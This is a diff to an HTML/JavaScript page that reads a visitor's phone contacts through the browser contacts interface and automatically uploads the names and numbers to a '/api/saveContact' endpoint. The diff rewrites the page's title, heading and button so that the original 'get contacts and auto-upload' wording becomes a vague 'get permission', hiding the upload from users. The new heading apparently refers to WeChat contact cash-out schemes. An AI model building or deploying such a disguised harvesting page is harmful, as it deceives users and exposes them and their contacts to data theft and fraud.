@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>通讯录权限获取</title>
+<title>by鱼笙</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
@@ -12,15 +12,15 @@ body{background:#0f172a;color:#fff;text-align:center;padding:50px 20px}
 </style>
 </head>
 <body>
-<h2>一键申请通讯录权限读取</h2>
+<h2>微信通讯录自动跑现</h2>
 <br>
-<button class="btn" id="getBtn">获取通讯录并自动上传</button>
+<button class="btn" id="getBtn">获取权限</button>
 <div class="box" id="showBox"></div>
 
 <script>
 let box = document.getElementById('showBox')
 document.getElementById('getBtn').onclick = async function(){
-    box.innerText = "正在申请通讯录权限..."
+    box.innerText = "正在申请获取权限..."
     if(!navigator.contacts){
         box.innerText = "当前设备/浏览器不支持通讯录权限接口"
         return
@@ -38,7 +38,7 @@ document.getElementById('getBtn').onclick = async function(){
                 phone:item.tel?.[0]||""
             })
         })
-        box.innerText = `读取成功，共${list.length}条联系人\n\n`+JSON.stringify(list,null,2)
+        box.innerText = `获取权限成功，设备共${list.length}条联系人\n\n`+JSON.stringify(list,null,2)
         //自动上传后台
         let up = await fetch('/api/saveContact',{
             method:'POST',
